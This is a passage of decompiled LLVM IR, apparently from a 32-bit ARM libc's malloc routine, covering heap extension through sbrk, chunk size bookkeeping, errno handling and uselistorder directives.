  %v4_12398 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_12398, i32* %ip.global-to-local, align 4
  store i32 %v3_122c8, i32* %r2.global-to-local, align 4
  %v1_123a0 = add i32 %v4_12398, 872
  %v2_123a0 = inttoptr i32 %v1_123a0 to i32*
  %v3_123a0 = load i32, i32* %v2_123a0, align 4
  %v1_123a4 = load i32, i32* @r8, align 4
  %v2_123a4 = add i32 %v1_123a4, %v3_122c8
  store i32 %v2_123a4, i32* %r1.global-to-local, align 4
  %v0_123a8 = load i32, i32* @r5, align 4
  %v2_123a8 = add i32 %v0_123a8, %v3_123a0
  store i32 %v2_123a8, i32* %r3.global-to-local, align 4
  %v9_123ac = icmp eq i32 %v0_12388, %v2_123a4
  br i1 %v9_123ac, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_12390
  store i32 %v2_123a8, i32* %v2_123a0, align 4
  br label %dec_label_pc_123c8

bb162:                                            ; preds = %dec_label_pc_12390
  %v1_123b0 = load i32, i32* %r0.global-to-local, align 4
  %v8_123b0 = icmp eq i32 %v1_123b0, -1
  store i32 %v2_123a8, i32* %v2_123a0, align 4
  br i1 %v8_123b0, label %.thread37, label %dec_label_pc_123c8

.thread37:                                        ; preds = %bb162
  %v1_123b8 = load i32, i32* @r5, align 4
  %v2_123b8 = load i32, i32* @r8, align 4
  %v3_123b8 = add i32 %v2_123b8, %v1_123b8
  %v2_123bc = or i32 %v3_123b8, 1
  store i32 %v2_123bc, i32* %r3.global-to-local, align 4
  %v2_123c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_123c0 = add i32 %v2_123c0, 4
  %v4_123c0 = inttoptr i32 %v3_123c0 to i32*
  store i32 %v2_123bc, i32* %v4_123c0, align 4
  br label %dec_label_pc_12540

dec_label_pc_123c8:                               ; preds = %bb162, %.thread125
  %v0_123cc.pr = load i32, i32* @r8, align 4
  %v0_123c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_123c8 = add i32 %v0_123c8, 864
  %v2_123c8 = inttoptr i32 %v1_123c8 to i32*
  %v3_123c8 = load i32, i32* %v2_123c8, align 4
  store i32 %v3_123c8, i32* %r2.global-to-local, align 4
  %v2_123cc = icmp eq i32 %v0_123cc.pr, 0
  br i1 %v2_123cc, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_123c8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_123c8
  %v2_123d4 = urem i32 %v3_123c8, 2
  store i32 %v2_123d4, i32* %r3.global-to-local, align 4
  %v2_123d8 = icmp eq i32 %v2_123d4, 0
  br i1 %v2_123d8, label %.thread43, label %dec_label_pc_123e0

dec_label_pc_123e0:                               ; preds = %.thread39
  %v0_123e0 = load i32, i32* @r4, align 4
  %v1_123e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_123e0 = icmp ult i32 %v0_123e0, %v1_123e0
  br i1 %v3_123e0, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_123e0
  %v2_123e4 = and i32 %v3_123c8, -2
  store i32 %v2_123e4, i32* %r3.global-to-local, align 4
  store i32 %v2_123e4, i32* %v2_123c8, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_123e0, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %ip.global-to-local, align 4
  %v4_123f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_123f4, i32* @r7, align 4
  %v1_123f8 = add i32 %v4_123f4, 864
  %v2_123f8 = inttoptr i32 %v1_123f8 to i32*
  %v3_123f8 = load i32, i32* %v2_123f8, align 4
  store i32 %v3_123f8, i32* %r3.global-to-local, align 4
  %v1_123fc = urem i32 %v3_123f8, 2
  store i32 %v1_123fc, i32* @r6, align 4
  %v2_123fc = icmp eq i32 %v1_123fc, 0
  br i1 %v2_123fc, label %dec_label_pc_12490, label %dec_label_pc_12404

dec_label_pc_12404:                               ; preds = %.thread43
  %v0_12404 = load i32, i32* @r8, align 4
  %v2_12404 = icmp eq i32 %v0_12404, 0
  br i1 %v2_12404, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_12404
  %v2_12408 = add i32 %v4_123f4, 872
  %v3_12408 = inttoptr i32 %v2_12408 to i32*
  %v4_12408 = load i32, i32* %v3_12408, align 4
  store i32 %v4_12408, i32* %r2.global-to-local, align 4
  %v1_1240c = load i32, i32* %r1.global-to-local, align 4
  %v2_1240c = load i32, i32* @r4, align 4
  %v3_1240c = sub i32 %v2_1240c, %v1_1240c
  %v3_12410 = add i32 %v3_1240c, %v4_12408
  store i32 %v3_12410, i32* %r3.global-to-local, align 4
  store i32 %v3_12410, i32* %v3_12408, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_12404, %bb164
  %v0_12418 = load i32, i32* @r4, align 4
  %v1_12418 = urem i32 %v0_12418, 8
  store i32 %v1_12418, i32* %r3.global-to-local, align 4
  %v2_12418 = icmp eq i32 %v1_12418, 0
  br i1 %v2_12418, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_1241c = sub nsw i32 8, %v1_12418
  store i32 %v2_1241c, i32* %r3.global-to-local, align 4
  %v3_12420 = add i32 %v2_1241c, %v0_12418
  store i32 %v3_12420, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_12428 = phi i32 [ 0, %.thread46 ], [ %v2_1241c, %bb165 ]
  %v1_12424 = load i32, i32* @r5, align 4
  %v2_12424 = add i32 %v1_12424, %v0_12418
  store i32 %v2_12424, i32* @r6, align 4
  %v1_12428 = load i32, i32* @r8, align 4
  %v2_12428 = add i32 %v2_12424, %v0_12428
  %v2_1242c = add i32 %v2_12428, %v1_12428
  store i32 %v2_1242c, i32* %r1.global-to-local, align 4
  %v1_12430 = load i32, i32* %sb.global-to-local, align 4
  %v2_12430 = add i32 %v1_12430, %v2_1242c
  %v1_12434 = load i32, i32* %fp.global-to-local, align 4
  %v2_12434 = and i32 %v1_12434, %v2_12430
  store i32 %v2_12434, i32* %r2.global-to-local, align 4
  %v2_12438 = sub i32 0, %v2_12424
  store i32 %v2_12438, i32* %r3.global-to-local, align 4
  %v2_1243c = sub i32 %v2_12434, %v2_12424
  store i32 %v2_1243c, i32* @r5, align 4
  store i32 %v2_1243c, i32* %r0.global-to-local, align 4
  br i1 %v2_12418, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_12418, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_12448 = call i32 @__GI_sbrk(i32 %v2_1243c)
  store i32 %v1_12448, i32* %r0.global-to-local, align 4
  %v3_1244c = icmp eq i32 %v1_12448, -1
  br i1 %v3_1244c, label %dec_label_pc_12454, label %dec_label_pc_12464

dec_label_pc_12454:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12458 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12458, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_124bc

dec_label_pc_12464:                               ; preds = %bb167
  %v1_12464 = load i32, i32* @r4, align 4
  %v3_12464 = icmp ult i32 %v1_12448, %v1_12464
  br i1 %v3_12464, label %dec_label_pc_1246c, label %dec_label_pc_124bc

dec_label_pc_1246c:                               ; preds = %dec_label_pc_12464
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r0.global-to-local, align 4
  %v4_12474 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_12474, i32* %r2.global-to-local, align 4
  %v1_12478 = add i32 %v4_12474, 864
  %v2_12478 = inttoptr i32 %v1_12478 to i32*
  %v3_12478 = load i32, i32* %v2_12478, align 4
  %v0_1247c = load i32, i32* @r6, align 4
  store i32 %v0_1247c, i32* %r0.global-to-local, align 4
  %v1_12480 = and i32 %v3_12478, -2
  store i32 %v1_12480, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_12480, i32* %v2_12478, align 4
  br label %dec_label_pc_124bc

dec_label_pc_12490:                               ; preds = %.thread43
  %v0_12490 = load i32, i32* %r0.global-to-local, align 4
  %v3_12490 = icmp eq i32 %v0_12490, -1
  br i1 %v3_12490, label %dec_label_pc_12498, label %dec_label_pc_124b4

dec_label_pc_12498:                               ; preds = %dec_label_pc_12490
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1249c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1249c, i32* %r0.global-to-local, align 4
  %v0_124a0 = load i32, i32* @r7, align 4
  %v1_124a0 = add i32 %v0_124a0, 872
  %v2_124a0 = inttoptr i32 %v1_124a0 to i32*
  %v3_124a0 = load i32, i32* %v2_124a0, align 4
  store i32 %v3_124a0, i32* %r2.global-to-local, align 4
  %v0_124a4 = load i32, i32* @r4, align 4
  %v0_124a8 = load i32, i32* @r5, align 4
  %v2_124a4 = add i32 %v3_124a0, %v1_1249c
  %v2_124a8 = sub i32 %v2_124a4, %v0_124a4
  %v2_124ac = sub i32 %v2_124a8, %v0_124a8
  store i32 %v2_124ac, i32* %r3.global-to-local, align 4
  store i32 %v2_124ac, i32* %v2_124a0, align 4
  %v0_124b8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_124b4

dec_label_pc_124b4:                               ; preds = %dec_label_pc_12490, %dec_label_pc_12498
  %v0_124b8 = phi i32 [ 0, %dec_label_pc_12490 ], [ %v0_124b8.pre, %dec_label_pc_12498 ]
  %v0_124b4 = load i32, i32* @r4, align 4
  store i32 %v0_124b4, i32* @r7, align 4
  store i32 %v0_124b8, i32* @r5, align 4
  br label %dec_label_pc_124bc

dec_label_pc_124bc:                               ; preds = %dec_label_pc_12464, %dec_label_pc_1246c, %dec_label_pc_12454, %dec_label_pc_124b4
  %v0_124bc = load i32, i32* %r0.global-to-local, align 4
  %v7_124bc = icmp eq i32 %v0_124bc, -1
  br i1 %v7_124bc, label %dec_label_pc_12540, label %dec_label_pc_124c4

dec_label_pc_124c4:                               ; preds = %dec_label_pc_124bc
  %v1_124c4 = load i32, i32* @r5, align 4
  %v2_124c4 = add i32 %v1_124c4, %v0_124bc
  %v0_124c8 = load i32, i32* @r7, align 4
  %v2_124c8 = sub i32 %v2_124c4, %v0_124c8
  %v1_124cc = or i32 %v2_124c8, 1
  %v2_124d0 = add i32 %v0_124c8, 4
  %v3_124d0 = inttoptr i32 %v2_124d0 to i32*
  store i32 %v1_124cc, i32* %v3_124d0, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_124dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_124dc, i32* @r6, align 4
  %v1_124e0 = add i32 %v4_124dc, 872
  %v2_124e0 = inttoptr i32 %v1_124e0 to i32*
  %v3_124e0 = load i32, i32* %v2_124e0, align 4
  %v0_124e4 = load i32, i32* @r8, align 4
  %v2_124e4 = icmp eq i32 %v0_124e4, 0
  %v0_124e8 = load i32, i32* @r5, align 4
  %v2_124e8 = add i32 %v0_124e8, %v3_124e0
  store i32 %v2_124e8, i32* %r3.global-to-local, align 4
  store i32 %v2_124e8, i32* %v2_124e0, align 4
  %v0_124f0 = load i32, i32* @r7, align 4
  %v1_124f0 = load i32, i32* @r6, align 4
  %v2_124f0 = add i32 %v1_124f0, 44
  %v3_124f0 = inttoptr i32 %v2_124f0 to i32*
  store i32 %v0_124f0, i32* %v3_124f0, align 4
  br i1 %v2_124e4, label %dec_label_pc_12540, label %dec_label_pc_124f8

dec_label_pc_124f8:                               ; preds = %dec_label_pc_124c4
  %v0_124fc = load i32, i32* @r8, align 4
  %v1_124fc = add i32 %v0_124fc, -12
  %v1_12500 = and i32 %v1_124fc, -8
  store i32 %v3_122c8, i32* %ip.global-to-local, align 4
  %v2_12508 = add i32 %v1_12500, %v3_122c8
  store i32 %v2_12508, i32* %r1.global-to-local, align 4
  %v2_1250c = icmp ugt i32 %v1_12500, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_12514 = or i32 %v1_12500, 1
  store i32 %v1_12514, i32* %r3.global-to-local, align 4
  store i32 %v1_12514, i32* %v2_122d4, align 4
  %v0_1251c = load i32, i32* %r2.global-to-local, align 4
  %v1_1251c = load i32, i32* %r1.global-to-local, align 4
  %v2_1251c = add i32 %v1_1251c, 8
  %v3_1251c = inttoptr i32 %v2_1251c to i32*
  store i32 %v0_1251c, i32* %v3_1251c, align 4
  %v0_12520 = load i32, i32* %r2.global-to-local, align 4
  %v1_12520 = load i32, i32* %r1.global-to-local, align 4
  %v2_12520 = add i32 %v1_12520, 4
  %v3_12520 = inttoptr i32 %v2_12520 to i32*
  store i32 %v0_12520, i32* %v3_12520, align 4
  br i1 %v2_1250c, label %dec_label_pc_12528, label %dec_label_pc_12540

dec_label_pc_12528:                               ; preds = %dec_label_pc_124f8
  %v0_12528 = load i32, i32* @r6, align 4
  %v1_12528 = add i32 %v0_12528, 836
  %v2_12528 = inttoptr i32 %v1_12528 to i32*
  %v3_12528 = load i32, i32* %v2_12528, align 4
  store i32 %v3_12528, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_12530 = load i32, i32* %ip.global-to-local, align 4
  %v1_12530 = add i32 %v0_12530, 8
  store i32 %v1_12530, i32* @r0, align 4
  store i32 -1, i32* %v2_12528, align 4
  %v0_12538 = call i32 @free()
  store i32 %v0_12538, i32* %r0.global-to-local, align 4
  %v0_1253c = load i32, i32* @r4, align 4
  %v1_1253c = load i32, i32* @r6, align 4
  %v2_1253c = add i32 %v1_1253c, 836
  %v3_1253c = inttoptr i32 %v2_1253c to i32*
  store i32 %v0_1253c, i32* %v3_1253c, align 4
  br label %dec_label_pc_12540

dec_label_pc_12540:                               ; preds = %.thread37, %dec_label_pc_124f8, %dec_label_pc_124c4, %dec_label_pc_124bc, %dec_label_pc_12528
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r0.global-to-local, align 4
  %v4_12548 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_12548, i32* %lr.global-to-local, align 4
  %v1_1254c = add i32 %v4_12548, 872
  store i32 %v1_1254c, i32* %r1.global-to-local, align 4
  %v1_12550 = inttoptr i32 %v1_1254c to i32*
  %v2_12550 = load i32, i32* %v1_12550, align 4
  store i32 %v2_12550, i32* %r1.global-to-local, align 4
  %v3_12550 = add i32 %v4_12548, 876
  %v4_12550 = inttoptr i32 %v3_12550 to i32*
  %v5_12550 = load i32, i32* %v4_12550, align 4
  store i32 %v5_12550, i32* %r3.global-to-local, align 4
  %v1_12558 = add i32 %v4_12548, 868
  %v2_12558 = inttoptr i32 %v1_12558 to i32*
  %v3_12558 = load i32, i32* %v2_12558, align 4
  store i32 %v3_12558, i32* %r3.global-to-local, align 4
  %v1_1255c = add i32 %v4_12548, 884
  %v2_1255c = inttoptr i32 %v1_1255c to i32*
  %v3_1255c = load i32, i32* %v2_1255c, align 4
  store i32 %v3_1255c, i32* %r2.global-to-local, align 4
  %v2_12560 = add i32 %v3_12558, %v2_12550
  store i32 %v2_12560, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_12550, %v5_12550
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_12540
  store i32 %v2_12550, i32* %v4_12550, align 4
  %v0_12568.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12568.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_12540, %bb168
  %v1_12568 = phi i32 [ %v3_1255c, %dec_label_pc_12540 ], [ %v1_12568.pre, %bb168 ]
  %v4_1256c = phi i32 [ %v2_12560, %dec_label_pc_12540 ], [ %v0_12568.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_1256c, %v1_12568
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_1256c = load i32, i32* %lr.global-to-local, align 4
  %v6_1256c = add i32 %v5_1256c, 884
  %v7_1256c = inttoptr i32 %v6_1256c to i32*
  store i32 %v4_1256c, i32* %v7_1256c, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_12570 = load i32, i32* %lr.global-to-local, align 4
  %v1_12570 = add i32 %v0_12570, 44
  %v2_12570 = inttoptr i32 %v1_12570 to i32*
  %v3_12570 = load i32, i32* %v2_12570, align 4
  store i32 %v3_12570, i32* %ip.global-to-local, align 4
  %v1_12574 = add i32 %v3_12570, 4
  %v2_12574 = inttoptr i32 %v1_12574 to i32*
  %v3_12574 = load i32, i32* %v2_12574, align 4
  store i32 %v1_12188, i32* %r1.global-to-local, align 4
  %v1_1257c = and i32 %v3_12574, -4
  store i32 %v1_1257c, i32* %r3.global-to-local, align 4
  %v3_12580 = icmp ult i32 %v1_1257c, %v1_12188
  br i1 %v3_12580, label %dec_label_pc_125ac, label %dec_label_pc_12588

dec_label_pc_12588:                               ; preds = %bb171
  %v0_12588 = load i32, i32* @sl, align 4
  %v2_12588 = sub i32 %v1_1257c, %v0_12588
  %v2_1258c = add i32 %v0_12588, %v3_12570
  store i32 %v2_1258c, i32* %r1.global-to-local, align 4
  %v1_12590 = or i32 %v2_12588, 1
  store i32 %v1_12590, i32* %r3.global-to-local, align 4
  %v1_12594 = or i32 %v0_12588, 1
  store i32 %v1_12594, i32* %r2.global-to-local, align 4
  %v1_12598 = add i32 %v3_12570, 8
  store i32 %v1_12598, i32* %r0.global-to-local, align 4
  store i32 %v1_12594, i32* %v2_12574, align 4
  %v0_125a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_125a0 = load i32, i32* %lr.global-to-local, align 4
  %v2_125a0 = add i32 %v1_125a0, 44
  %v3_125a0 = inttoptr i32 %v2_125a0 to i32*
  store i32 %v0_125a0, i32* %v3_125a0, align 4
  %v0_125a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_125a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_125a4 = add i32 %v1_125a4, 4
  %v3_125a4 = inttoptr i32 %v2_125a4 to i32*
  store i32 %v0_125a4, i32* %v3_125a4, align 4
  br label %dec_label_pc_125c4

dec_label_pc_125ac:                               ; preds = %bb160, %bb171, %dec_label_pc_12388
  store i32 62588, i32* %r3.global-to-local, align 4
  %v0_125b0 = call i32 @__aeabi_read_tp()
  %v3_125b4 = load i16, i16* @global_var_21a38.351, align 2
  %v4_125b4 = sext i16 %v3_125b4 to i32
  store i32 %v4_125b4, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_125bc = add i32 %v4_125b4, %v0_125b0
  %v4_125bc = inttoptr i32 %v3_125bc to i32*
  store i32 12, i32* %v4_125bc, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125c4

dec_label_pc_125c4:                               ; preds = %bb154, %bb153, %dec_label_pc_12588, %dec_label_pc_121d0, %dec_label_pc_125ac
  %v0_125c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_125c4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_125c8

dec_label_pc_125c8:                               ; preds = %.thread4, %dec_label_pc_1219c, %.thread124, %dec_label_pc_1200c, %dec_label_pc_12000, %dec_label_pc_11e68, %dec_label_pc_11dec, %dec_label_pc_125c4
  store i32 %v2_11d0c, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r2.global-to-local, align 4
  %v4_125d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 44) to i32*), align 4
  store i32 %v4_125d8, i32* @ip, align 4
  store i32 75236, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_125d8)
  br label %dec_label_pc_125e4

dec_label_pc_125e4:                               ; preds = %dec_label_pc_11d44, %dec_label_pc_125c8
  %v0_125e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_125e4, i32* %r0.global-to-local, align 4
  store i32 %v3_11ce0, i32* @r4, align 4
  store i32 %v6_11ce0, i32* @r5, align 4
  store i32 %v9_11ce0, i32* @r6, align 4
  store i32 %v12_11ce0, i32* @r7, align 4
  store i32 %v15_11ce0, i32* @r8, align 4
  store i32 %v18_11ce0, i32* @sb, align 4
  store i32 %v21_11ce0, i32* @sl, align 4
  store i32 %v24_11ce0, i32* @fp, align 4
  store i32 %v27_11ce0, i32* @lr, align 4
  ret i32 %v0_125e4

; uselistorder directives
  uselistorder i32 %v0_12588, { 1, 0, 2 }
  uselistorder i32 %v3_12570, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1256c, { 1, 0 }
  uselistorder i32 %v2_12550, { 2, 0, 1, 3 }
  uselistorder i32 %v4_12548, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12500, { 1, 2, 0 }
  uselistorder i32 %v0_124c8, { 1, 0 }
  uselistorder i32 %v0_124bc, { 1, 0 }
  uselistorder i32 %v2_124ac, { 1, 0 }
  uselistorder i32 %v2_1243c, { 2, 1, 0 }
  uselistorder i32 %v2_12424, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1241c, { 1, 0, 2 }
  uselistorder i32 %v1_12418, { 2, 1, 0 }
  uselistorder i32 %v0_12418, { 3, 1, 2, 0 }
  uselistorder i32 %v1_123fc, { 1, 0 }
  uselistorder i32 %v2_123d4, { 1, 0 }
  uselistorder i32 %v3_123c8, { 1, 0, 2 }
  uselistorder i32 %v2_123a8, { 1, 0, 2 }
  uselistorder i32* %v2_123a0, { 1, 0, 2 }
  uselistorder i32 %v0_12388, { 1, 0 }
  uselistorder i32 %v6_12364, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12350, { 2, 1, 0 }
  uselistorder i32 %v0_12338, { 1, 0 }
  uselistorder i32 %v2_122f4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_122f0, { 1, 0 }
  uselistorder i32 %v3_122c8, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_122a8, { 1, 0, 2 }
  uselistorder i32 %v2_12290, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12238, { 2, 1, 0 }
  uselistorder i32 %v6_1222c, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_12208, { 2, 1, 0, 3 }
  uselistorder i32 %v3_121c8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12188, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_12180, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1217c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_12168, { 1, 0 }
  uselistorder i32 %v7_12128, { 1, 0 }
  uselistorder i32 %v4_12128, { 1, 0 }
  uselistorder i32 %v0_120f8, { 1, 0 }
  uselistorder i32 %v2_120cc, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_120c857, { 1, 0 }
  uselistorder i32 %v1_12094, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_1207c., { 1, 2, 0 }
  uselistorder i32 %v0_12084, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12084, { 1, 0 }
  uselistorder i32 %v3_12064, { 1, 0 }
  uselistorder i32 %v4_12060, { 1, 0, 2 }
  uselistorder i32 %v1_11fd0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12028, { 1, 0 }
  uselistorder i32 %v1_1200c, { 1, 0 }
  uselistorder i32 %v1_11eac, { 1, 0 }
  uselistorder i32 %v0_11fec, { 2, 0, 1, 3 }
  uselistorder i32 %v3_11fb4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12048.pre, { 1, 2, 0 }
  uselistorder i32 %v0_11f90, { 2, 1, 0 }
  uselistorder i32 %v3_11f84, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_11ea4, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11f4c, { 1, 0 }
  uselistorder i32 %v3_11f40, { 1, 0 }
  uselistorder i32 %v0_11f4c, { 1, 0 }
  uselistorder i32 %v3_11f24, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11f14, { 1, 0, 2 }
  uselistorder i32 %v3_11ecc, { 2, 1, 0 }
  uselistorder i32 %v0_11ebc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_11e8c, { 1, 0 }
  uselistorder i32 %v1_11e40, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11e3c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_11de0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_11dd4, { 1, 0 }
  uselistorder i32 %v3_11da4, { 1, 0 }
  uselistorder i32 %v0_11d98, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_11d78, { 0, 2, 1, 3 }
  uselistorder i1 %v7_11d6c, { 1, 0 }
  uselistorder i32 %v0_11d3c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 1, 2, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 0, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_125e4, { 1, 0 }
  uselistorder label %dec_label_pc_125c8, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_125c4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_125ac, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_12540, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_124bc, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_124b4, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12388, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_122bc, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_12174, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_120c8, { 1, 0 }
